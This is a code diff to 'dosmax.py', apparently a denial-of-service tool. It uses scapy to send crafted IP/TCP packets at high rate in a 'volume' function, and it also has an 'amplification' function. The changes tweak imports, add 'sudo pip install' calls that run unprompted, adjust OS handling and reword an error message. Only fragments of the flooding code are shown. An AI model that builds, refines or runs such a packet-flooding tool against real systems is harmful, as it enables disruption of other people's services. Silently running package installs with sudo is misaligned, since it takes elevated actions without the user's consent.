@@ -1,12 +1,13 @@
+from sys import argv
 from os import system
-from sys import platform, argv
+from sys import platform
 
 try:
    if argv[1] in ['--global', '-G'] and platform == 'linux':
       with open('dosmax.py') as file:
          lines = file.readlines()
          code = '#!/usr/bin/python3\n'
-         for i in range(3):
+         for i in range(1, 3):
             code += lines[i]
          for i in range(26, len(lines)):
             code += lines[i]
@@ -21,7 +22,7 @@ try:
       print('Dosmax version 2.0')
       exit()
 except:
-   exit()
+   pass
 
 from random import randint
 from threading import Thread
@@ -30,25 +31,20 @@ from time import sleep
 try:
    from scapy.all import *
 except:
-   system('pip install scapy')
+   system('sudo pip install scapy')
    from scapy.all import *
 
-try:
-   from colorama import init
-except:
-   system('pip install colorama')
-   from colorama import init
-
-init()
-
 if platform in ['win32', 'win64']:
-      system('cls')
-else:
    try:
-      system('clear')
+      from colorama import init
    except:
-      print('  \033[1;37m\033[1;48;5;197m[ERROR] UNSUPPORTED OS', '\033[0;0m')
-      exit()
+      system('sudo pip install colorama');
+      from colorama import init
+   init()
+   system('cls')
+      
+else:
+   system('clear')
 
 print('''
 \033[1;38;5;196m █▀▀▄  █▀▀▀█  █▀▀▀█  █▀▄▀█ ─█▀▀█ ▀▄ ▄▀ 
@@ -89,7 +85,7 @@ def volume():
             pkt = IP1 / TCP1
             send(pkt, inter=0.001)
       except:
-         print('  \033[1;37m\033[1;48;5;197m[ERROR] IP NOT FOUND', '\033[0;0m')
+         print('  \033[1;37m\033[1;48;5;197m[ERROR] UNRECONIZED IP ADRESS', '\033[0;0m')
          exit()
 
 def amplification():
